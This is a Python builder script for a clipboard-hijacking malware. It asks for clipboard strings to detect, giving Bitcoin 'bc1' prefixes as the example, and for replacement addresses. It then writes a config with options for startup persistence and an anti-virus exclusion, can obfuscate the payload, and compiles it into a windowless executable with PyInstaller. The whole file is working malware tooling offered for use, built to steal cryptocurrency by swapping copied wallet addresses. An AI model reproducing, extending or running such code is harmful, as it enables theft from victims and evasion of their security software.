from ui.colors import *
import ctypes

libraries = '''
import time, pyperclip, os, shutil
import winreg as reg
from lib.cfg.js_config import __config__ as __config__
'''

class cTypes:
    MB_OK = 0x0
    MB_OKCXL = 0x01
    MB_YESNOCXL = 0x03
    MB_YESNO = 0x04
    MB_HELP = 0x4000
    ICON_EXCLAIM = 0x30
    ICON_INFO = 0x40
    ICON_STOP = 0x10

class neo:
    def compile():
        vPath = os.getcwd()
        with open(f'{vPath}\\lib\\cfg\\js_config.py', 'w') as f:
            f.write(f'''class __config__:
    interval_update = 1
    detection_string = {detection_strings}
    pasted_string = {replacement_strings}
    install_set="{run_at_startup}"
    startup_set="{run_at_startup}"
    add_exclusion="{add_exclusion}"''')
        try:
            os.remove('src.exe')
        except:
            pass
        try:
            os.remove('src.spec')
        except:
            pass

        try:
            os.remove('Obfuscated_src.exe')
        except:
            pass
        try:
            os.remove('Obfuscated_src.spec')
        except:
            pass

        try:
            os.remove('src.py')
        except:
            pass
        try:
            os.remove('Obfuscated_src.py')
        except:
            pass

        def original_build():
            with open(f'{vPath}\\lib\\src.py', 'r', encoding='utf-8') as pf:
                fData = pf.readlines()
            obfuscatedData = fData[0]
            fData[0] = f"{libraries}\n{obfuscatedData}"
            with open(f'{vPath}\\src.py', 'w', encoding='utf-8') as pf:
                pf.writelines(fData)
            os.system(f'pyinstaller --icon=icon.ico --noconsole --distpath {vPath} --onefile {vPath}\\src.py')
            result = ctypes.windll.user32.MessageBoxW(0, f"If no errors have occured file will be under\n( {vPath}\src.exe )", "", cTypes.MB_OK, cTypes.ICON_EXCLAIM)
        def encode_obfuscate():
            os.system(f'python {vPath}\\dll\\tool_obfuscation.py {vPath}\\lib\\src.py')
            with open(f'{vPath}\\Obfuscated_src.py', 'r') as pf:
                fData = pf.readlines()
            obfuscatedData = fData[0]
            fData[0] = f"{libraries}\n{obfuscatedData}"
            with open(f'{vPath}\\Obfuscated_src.py', 'w') as pf:
                pf.writelines(fData)
            os.system(f'pyinstaller --icon=icon.ico --noconsole --distpath {vPath} --onefile {vPath}\\Obfuscated_src.py')
            result = ctypes.windll.user32.MessageBoxW(0, f"If no errors have occured file will be under\n( {vPath}\src.exe )", "", cTypes.MB_OK, cTypes.ICON_EXCLAIM)
        
        if c1 == 'y' or c1 == 'Y':
            encode_obfuscate()
        else:
            original_build()
        
        try:
            os.remove('Obfuscated_src.py')
        except:
            pass

    def reset_qv():
        neo.__init__()
    def qv():
        global detection_strings, replacement_strings
        global run_at_startup, add_exclusion, c1
        print(red("       [EXAMPLE:] bc1,bc2,bc3,bc4"))
        passed_arg=input(purple("       [>] Enter Strings To Detect [seperate by comma] "))
        detection_strings = passed_arg.split(',')
        replacement_strings = []
        #vv=input(purple(f"       [CHECK:] This is correct? ( {detection_strings} ) [Y/N] "))
        #if vv == 'n' or vv == 'N':
        #    neo.reset_qv()
        for x in range(len(detection_strings)):
            replace_string = input(purple(f"       [>] Enter Replacement String for ({detection_strings[x]}): "))
            replacement_strings.append(replace_string)
        
        print(purple(f"\n       [DETECT:]  {detection_strings}"))
        print(purple(f"\n       [REPLACE:] {replacement_strings}"))
        correct=input(purple(f"       [+] is this correct? [Y/N] "))
        if correct == "n" or correct == "N":
            neo.reset_qv()
        run_at_startup = input(purple("       [>] Run At Startup? [Y/N] "))
        add_exclusion = input(purple("       [>] Add Anti-Virus Exclusion? [Y/N] "))
        c1=input(purple("       [>] Obfuscate/Encrypt Executable? (May Break When Using External Files) [Y/N] "))
        neo.compile()
    def __init__():
        clear()
        print(water(ui.banner), end="")
        neo.qv()

if __name__=="__main__":
    neo.__init__()